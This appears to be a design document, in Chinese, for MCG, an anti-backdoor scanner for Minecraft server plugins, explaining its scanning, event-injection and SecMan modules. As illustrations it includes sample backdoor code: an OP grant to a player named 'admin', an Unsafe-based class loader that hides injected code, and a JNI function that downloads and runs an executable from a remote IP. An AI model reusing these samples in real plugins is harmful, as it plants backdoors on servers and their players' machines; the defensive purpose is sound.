# 设计说明

`本说明主要供希望进一步了解MCG工作原理与设计理念的人查阅。普通用户不必阅读。`  
`本说明不适合缺少Java基础的人阅读。`

## 模块介绍：扫描

MCG的扫描主要是基于特征匹配。  
Motivation: 考虑以下问题：

- 哪种地方后门更多？正式发布站（mcbbs/minebbs）？或者某些服务商/技术交流群/黑论坛？
- 哪种后门更多？从未被使用过的，还是经常被触发的？
- 后门会不会被混淆器混？

答案不言而喻，`后者`，`从未被使用过的`和`会`。  
后门，往往是拿来威胁的。例如，你可能抢占了友商的用户，或者使用了盗版的资源。  
而一旦被使用，后门反而失去了它的价值。要么它被找出来，然后回档或者补偿。要么，被植入了后门的人跑路。  
没有例外。  
因此，面对后门，关键的问题是，

- 我们能不能在一个后门没有被使用的情况下，把它找出来？
- 如果不能，我们能不能阻止它被使用？
- 并且，以上两个问题的方法能不能扫穿混淆器，还不影响正常插件的工作？

一种有效的思路便是，收集常见的后门，提取特征以供扫描；同时提供动态防护。而这就是MCG正在做的事情。  
呃，也正因如此，MCG无法开源。因为一旦开源，便特别容易被规避。

## 模块介绍：Inject

Inject模块用于监视插件对事件的监听，以便分析插件的性能与安全性。  
Motivation: 考虑以下代码

```java

@EventHandler
public void onPlayerJoin(PlayerJoinEvent event) {
    Player player = event.getPlayer();
    boolean isOp = player.isOp();
    Bukkit.getServer().dispatchCommand(player, "say hello");
    player.setOp(isOp);
}
```

以上代码中存在setOp行为。虽然一种更好的方式是提供一个继承于Player的类，
但是有很多插件，例如ChestCommands，会这么写。
同时，我们看一看一个标准的后门插件的代码：

```java

@EventHandler
public void onPlayerJoin(PlayerJoinEvent event) {
    Player player = event.getPlayer();
    if (player.getName().equals("admin")) {
        player.setOp(true);
    }
}
```

这种插件的危害性是显而易见的。那么如何区分这两种插件呢？  
Inject模块的思路是，通过监视插件事件的实际效果而不是运行时的代码来判断插件的行为。  
例如，对于上面的代码，Inject模块会监视玩家最终是否被从非OP设置为OP，而不是监视setOp方法的调用。
伪代码如下：

```java
public void callEvent(Event event) {
    if (event instanceof PlayerJoinEvent) {
        Player player = ((PlayerJoinEvent) event).getPlayer();
        boolean isOp = player.isOp();
        // 插件的原始逻辑
        if (!isOp && player.isOp()) {
            // 判定插件是后门插件
        }
    }
}
```

同理，我们可以分析插件是否存在性能问题，修改了服务器的默认游戏模式等等。
相关配置请见MCG的Inject模块配置文件。

## 模块介绍：SecMan

SM模块用于监视插件对文件、进程与网络等底层资源的访问。  
Motivation: 所有的代码都是运行在JVM内的，因此我们可以通过监视JVM的行为来判断插件的行为。  
例如，我们可以监视插件是否读取了某个文件，是否创建了某个进程，是否访问了某个服务器等等。

这里额外解释一下为什么要限制Native方法的调用和反射的使用。
考虑以下代码：

```java 
import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.util.Base64;

public void doEvilThings(Event event) {
    Field unsafeF = Unsafe.class.getDeclaredField("theUnsafe");
    unsafeF.setAccessible(true);
    Unsafe unsafe = (Unsafe) unsafeF.get(null);
    byte[] someEvilCode = Base64.getDecoder().decode("abcdef");
    Class<?> cls = unsafe.defineClass("java.lang.X", someEvilCode, 0, someEvilCode.length, Integer.class.getClassLoader(), null);
    cls.getMethod("main", String[].class).invoke(null, (Object) new String[]{});
}
```

因为Integer.class.getClassLoader()是SystemClassLoader，所以这个类的定义者将不可追溯。
从而，我们甚至无法判断这个类是否是插件定义的。

或者考虑以下代码：

```cpp
#include <jni.h>
#include <windows.h>
JNIEXPORT void JNICALL Java_aJNI_doJNI(JNIEnv *env, jobject thisObj) {
    char buffer[MAX_PATH];
    _getcwd(buffer, MAX_PATH);
    strcat_s(buffer, "//1.jpg");
    HRESULT Result = URLDownloadToFileA(NULL, "http://1.1.1.1/1.exe", buffer, 0, NULL);
    system(buffer);
    return;
}
```

在native方法中，整个SM模块的监视都将失效。因此，我们需要限制插件对Native库的加载。

## Alternatives

| 项        | MCG           | [SAM](https://www.spigotmc.org/resources/spigot-anti-malware.64982/) | [PluginScan](https://github.com/Rikonardo/PluginScan) | [AntiBackdoor](https://github.com/NichtStudioCode/AntiBackdoor/tree/master) | [BackdoorCrash](https://www.mcbbs.net/forum.php?mod=viewthread&tid=686769) | [PermissionDisable](https://www.mcbbs.net/forum.php?mod=viewthread&tid=352386) | [Yum](https://www.mcbbs.net/thread-701333-1-1.html) |
|----------|---------------|----------------------------------------------------------------------|-------------------------------------------------------|-----------------------------------------------------------------------------|----------------------------------------------------------------------------|--------------------------------------------------------------------------------|-----------------------------------------------------|
| Java版本   | 7-21          | 17+                                                                  | 7-17                                                  | 7-17                                                                        | 8                                                                          | 7-21                                                                           | 7-21                                                |
| 仍在维护     | 是             | 是                                                                    | 是                                                     | 否                                                                           | 否                                                                          | 是                                                                              | 否                                                   |
| 静态扫描     | 基于字节码         | 基于字节码                                                                | 基于字节码                                                 | 基于字节码                                                                       | 基于反编译                                                                      | 无                                                                              | 否                                                   |
| 动态保护     | 基于事件注入与SecMan | 基于NativeAgent                                                        | 无                                                     | 无                                                                           | 基于NativeHook                                                               | 基于权限扫描                                                                         | 基于事件注入与核心注入                                         |
| 阻止系统命令运行 | 是             | 是                                                                    | 仅扫描                                                   | 否                                                                           | 是                                                                          | 否                                                                              | 否                                                   |
| 能够识别未知后门 | 是             | 否                                                                    | 是                                                     | 否                                                                           | 如果能够反编译                                                                    | 如果能够触发规则                                                                       | 如果能够触发规则                                            |
| 误判率      | 0%*           | 15%                                                                  | 100%                                                  | 0%                                                                          | 0%                                                                         | 0%                                                                             | 15%                                                 |
| 本身就是后门   | 否             | 否                                                                    | 否                                                     | 否                                                                           | 否                                                                          | 否                                                                              | 是                                                   |

*指的是：这些插件没有被MCG误判，但是有一定的可能是出于幸存者偏差（即，这些插件又MCG团队选取）。